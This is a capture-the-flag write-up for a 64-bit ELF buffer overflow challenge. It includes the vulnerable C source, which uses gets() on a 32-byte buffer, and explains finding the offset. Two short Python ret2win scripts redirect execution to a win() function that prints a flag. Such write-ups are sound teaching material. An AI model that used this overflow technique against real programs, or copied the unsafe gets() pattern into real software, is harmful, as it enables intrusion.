---
description: Buffer overflow in 64 bit ELF
---

# simple offer



```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void win() {
  char buf[64];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s", "You are at the right place, create a local flag to test.\n");
    exit(0);
  }

  fgets(buf,64,f);
  printf(buf);
}

void vuln(){
  char buf[32];
  gets(buf);

  printf("Taking the request to 0x%x\n", __builtin_return_address(0));
}

int main(int argc, char **argv){

  puts("Hello, what can I help you with? : ");
  vuln();
  return 0;
}
```

The code above was given with a compiled binary, which was also running on a remote server.

As we can seee, we need to access win() function so we can make the server read our flag.

Let's create a 64 byte buffer and see what happens

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

We see segmentation fault at 64 bytes. Let's figure out the RIP offset.

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

So the offset was 40. Let's create a simple payload to see if we can overwrite the return address.

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

We can see that the return address was being overwritten.

But the problem is we still don't know win() function's address. So I used objdump to find it. Then after 40 bytes, we can put win()'s address to make EIP point to that function and execute it with the payload provided.

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

I used the following script to execute win function and make it read /flag.txt (demo flag in my local system)

```python
import sys
import os

#00401176

buffer = "A"*40 + "\x76\x11\x40\x00"

print buffer
```

<figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

I tried running it on remote server but it didn't work. Then on discord, Amazon's team notified about a discrepancy in compiling binary glibc. So, I added 0x20 to the current return address and it worked!

```python
import sys
import os

#00401196

buffer = "A"*40 + "\x96\x11\x40\x00"

print buffer
```

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>
